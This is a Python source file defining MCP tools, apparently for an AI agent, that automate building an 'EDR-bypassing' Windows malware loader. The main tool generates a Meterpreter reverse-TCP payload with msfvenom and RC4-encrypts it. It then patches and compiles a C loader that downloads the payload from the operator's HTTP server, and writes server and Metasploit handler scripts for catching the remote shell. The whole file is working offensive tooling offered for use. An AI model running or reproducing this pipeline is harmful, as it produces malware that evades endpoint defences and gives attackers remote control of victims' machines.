#!/usr/bin/env python3
"""
Stageless Loader MCP Tools
Standalone tools for generating EDR-bypassing stageless loaders
No server required - works directly!
"""
import subprocess
import os
import sys
from pathlib import Path

try:
    from fastmcp import FastMCP
except ImportError:
    print("[!] FastMCP not installed: pip install fastmcp")
    sys.exit(1)

mcp = FastMCP("Stageless-Loader")

# Base directory for stageless loader
BASE_DIR = Path(__file__).parent.parent / "staged-loader"


@mcp.tool()
def generate_stageless_loader(
    lhost: str,
    lport: int = 4444,
    http_port: int = 8080,
    output_dir: str = None
) -> str:
    """
    Generate complete stageless loader system (payload + loader + scripts).

    This is the main tool - it does EVERYTHING automatically!

    Args:
        lhost: Your Kali IP address (e.g., "192.168.1.56")
        lport: Meterpreter listener port (default: 4444)
        http_port: HTTP server port for payload delivery (default: 8080)
        output_dir: Output directory (default: staged-loader/)

    Returns:
        Success message with generated files and next steps
    """
    try:
        # Set output directory
        if output_dir:
            work_dir = Path(output_dir).absolute()
        else:
            work_dir = BASE_DIR

        work_dir.mkdir(parents=True, exist_ok=True)
        os.chdir(work_dir)

        output = []
        output.append("=" * 70)
        output.append("  GENERATING STAGELESS LOADER SYSTEM")
        output.append("=" * 70)
        output.append(f"LHOST: {lhost}")
        output.append(f"LPORT: {lport}")
        output.append(f"HTTP Port: {http_port}")
        output.append(f"Output: {work_dir}")
        output.append("")

        # Step 1: Generate MSFVenom payload
        output.append("[1/5] Generating MSFVenom payload...")
        payload_file = work_dir / "reverse_shell.bin"

        cmd = [
            "msfvenom",
            "-p", "windows/x64/meterpreter_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw",
            "-o", str(payload_file)
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            return f"ERROR: MSFVenom failed\n{result.stderr}"

        payload_size = payload_file.stat().st_size
        output.append(f"  ✓ Payload generated: {payload_size} bytes")
        output.append("")

        # Step 2: Encrypt payload
        output.append("[2/5] Encrypting payload with RC4...")

        # Run encrypt_payload.py
        encrypt_script = work_dir / "encrypt_payload.py"
        if not encrypt_script.exists():
            return f"ERROR: encrypt_payload.py not found in {work_dir}"

        cmd = ["python3", str(encrypt_script), str(payload_file), "payload.enc"]
        result = subprocess.run(cmd, capture_output=True, text=True, cwd=work_dir)

        if result.returncode != 0:
            return f"ERROR: Encryption failed\n{result.stderr}"

        output.append(f"  ✓ Payload encrypted: payload.enc")
        output.append(f"  ✓ Keys saved: payload_keys.h")
        output.append("")

        # Step 3: Update loader source with new key
        output.append("[3/5] Updating loader source...")

        # Read generated key
        keys_file = work_dir / "payload_keys.h"
        with open(keys_file, 'r') as f:
            keys_content = f.read()

        # Extract key line
        for line in keys_content.split('\n'):
            if 'g_Rc4Key[32]' in line and 'static' in line:
                new_key_line = line.strip()
                break
        else:
            return "ERROR: Could not extract RC4 key from payload_keys.h"

        # Update staged_loader.c
        loader_source = work_dir / "staged_loader.c"
        with open(loader_source, 'r') as f:
            loader_code = f.read()

        # Replace key line
        import re
        pattern = r'static BYTE g_Rc4Key\[32\] = \{.*?\};'
        loader_code = re.sub(pattern, new_key_line, loader_code)

        # Update URL
        old_url_pattern = r'char url\[\] = ".*?";'
        new_url = f'char url[] = "http://{lhost}:{http_port}/payload.enc";'
        loader_code = re.sub(old_url_pattern, new_url, loader_code)

        with open(loader_source, 'w') as f:
            f.write(loader_code)

        output.append(f"  ✓ Loader updated with new key and URL")
        output.append("")

        # Step 4: Compile loader
        output.append("[4/5] Compiling loader...")

        loader_exe = work_dir / "staged_loader.exe"
        cmd = [
            "x86_64-w64-mingw32-gcc",
            "-O2", "-s",
            str(loader_source),
            "-o", str(loader_exe),
            "-lurlmon"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, cwd=work_dir)
        if result.returncode != 0:
            return f"ERROR: Compilation failed\n{result.stderr}"

        loader_size = loader_exe.stat().st_size
        output.append(f"  ✓ Loader compiled: {loader_size} bytes")
        output.append("")

        # Step 5: Create server and listener scripts
        output.append("[5/5] Creating server and listener scripts...")

        # HTTP server script
        server_script = work_dir / "start_server.sh"
        with open(server_script, 'w') as f:
            f.write(f"""#!/bin/bash
# HTTP Server for Stageless Payload Delivery

echo "[*] Starting HTTP server on port {http_port}..."
echo "[*] Serving from: $(pwd)"
echo "[*] Payload URL: http://{lhost}:{http_port}/payload.enc"
echo ""
echo "[+] Server is running. Press CTRL+C to stop."
echo ""

cd {work_dir}
python3 -m http.server {http_port}
""")
        server_script.chmod(0o755)

        # Metasploit listener script
        listener_script = work_dir / "start_listener.sh"
        with open(listener_script, 'w') as f:
            f.write(f"""#!/bin/bash
# MSF Handler for Stageless Meterpreter

echo "[*] Starting Metasploit handler..."
echo "[*] Listening on: {lhost}:{lport}"
echo "[*] Payload: windows/x64/meterpreter_reverse_tcp (STAGELESS)"
echo ""

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j"
""")
        listener_script.chmod(0o755)

        output.append(f"  ✓ start_server.sh created")
        output.append(f"  ✓ start_listener.sh created")
        output.append("")

        # Success summary
        output.append("=" * 70)
        output.append("  ✅ STAGELESS LOADER SYSTEM READY!")
        output.append("=" * 70)
        output.append("")
        output.append("Generated files:")
        output.append(f"  - staged_loader.exe ({loader_size} bytes)")
        output.append(f"  - payload.enc ({payload_size} bytes encrypted)")
        output.append(f"  - start_server.sh")
        output.append(f"  - start_listener.sh")
        output.append("")
        output.append("Next steps:")
        output.append(f"  1. Terminal 1: cd {work_dir} && ./start_server.sh")
        output.append(f"  2. Terminal 2: cd {work_dir} && ./start_listener.sh")
        output.append(f"  3. Windows: Run staged_loader.exe")
        output.append("")
        output.append("=" * 70)

        return "\n".join(output)

    except Exception as e:
        return f"ERROR: {str(e)}\n\nMake sure you're in the Noctis-MCP directory and have:\n- msfvenom installed\n- mingw-w64 installed\n- encrypt_payload.py in staged-loader/"


@mcp.tool()
def start_http_server(
    port: int = 8080,
    directory: str = None
) -> str:
    """
    Start HTTP server to serve encrypted payload.

    Args:
        port: HTTP server port (default: 8080)
        directory: Directory to serve from (default: staged-loader/)

    Returns:
        Instructions for running server
    """
    if directory:
        work_dir = Path(directory).absolute()
    else:
        work_dir = BASE_DIR

    # Check if payload.enc exists
    payload_file = work_dir / "payload.enc"
    if not payload_file.exists():
        return f"ERROR: payload.enc not found in {work_dir}\n\nRun generate_stageless_loader first!"

    output = []
    output.append("=" * 70)
    output.append("  HTTP SERVER INSTRUCTIONS")
    output.append("=" * 70)
    output.append("")
    output.append(f"Directory: {work_dir}")
    output.append(f"Port: {port}")
    output.append(f"Payload: {payload_file}")
    output.append("")
    output.append("Run this command in a terminal:")
    output.append("")
    output.append(f"  cd {work_dir} && ./start_server.sh")
    output.append("")
    output.append("Or manually:")
    output.append(f"  cd {work_dir} && python3 -m http.server {port}")
    output.append("")
    output.append("=" * 70)

    return "\n".join(output)


@mcp.tool()
def start_metasploit_listener(
    lhost: str,
    lport: int = 4444,
    directory: str = None
) -> str:
    """
    Start Metasploit listener for stageless Meterpreter.

    Args:
        lhost: Your Kali IP
        lport: Listener port (default: 4444)
        directory: Directory with start_listener.sh (default: staged-loader/)

    Returns:
        Instructions for starting listener
    """
    if directory:
        work_dir = Path(directory).absolute()
    else:
        work_dir = BASE_DIR

    output = []
    output.append("=" * 70)
    output.append("  METASPLOIT LISTENER INSTRUCTIONS")
    output.append("=" * 70)
    output.append("")
    output.append(f"LHOST: {lhost}")
    output.append(f"LPORT: {lport}")
    output.append("Payload: windows/x64/meterpreter_reverse_tcp (STAGELESS)")
    output.append("")
    output.append("Run this command in a NEW terminal:")
    output.append("")
    output.append(f"  cd {work_dir} && ./start_listener.sh")
    output.append("")
    output.append("Or manually:")
    output.append(f"""  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"""")
    output.append("")
    output.append("Once session opens:")
    output.append("  sessions -l        # List sessions")
    output.append("  sessions -i 1      # Interact with session")
    output.append("")
    output.append("=" * 70)

    return "\n".join(output)


@mcp.tool()
def check_stageless_status(directory: str = None) -> str:
    """
    Check if stageless loader system is ready to use.

    Args:
        directory: Directory to check (default: staged-loader/)

    Returns:
        Status of generated files
    """
    if directory:
        work_dir = Path(directory).absolute()
    else:
        work_dir = BASE_DIR

    output = []
    output.append("=" * 70)
    output.append("  STAGELESS LOADER STATUS")
    output.append("=" * 70)
    output.append(f"Directory: {work_dir}")
    output.append("")

    # Check files
    files_to_check = {
        "staged_loader.exe": "Loader binary",
        "payload.enc": "Encrypted payload",
        "start_server.sh": "HTTP server script",
        "start_listener.sh": "Metasploit listener script",
        "encrypt_payload.py": "Encryption tool",
        "staged_loader.c": "Loader source code"
    }

    all_ready = True
    for filename, description in files_to_check.items():
        filepath = work_dir / filename
        if filepath.exists():
            size = filepath.stat().st_size
            output.append(f"✓ {filename:25s} {size:>10,} bytes - {description}")
        else:
            output.append(f"✗ {filename:25s} MISSING - {description}")
            all_ready = False

    output.append("")

    if all_ready:
        output.append("=" * 70)
        output.append("  ✅ SYSTEM READY!")
        output.append("=" * 70)
        output.append("")
        output.append("Next: Start server and listener, then run loader on Windows")
    else:
        output.append("=" * 70)
        output.append("  ❌ NOT READY - Run generate_stageless_loader first!")
        output.append("=" * 70)

    return "\n".join(output)


if __name__ == "__main__":
    print("[*] Stageless Loader MCP Tools Starting...")
    mcp.run(transport='stdio')
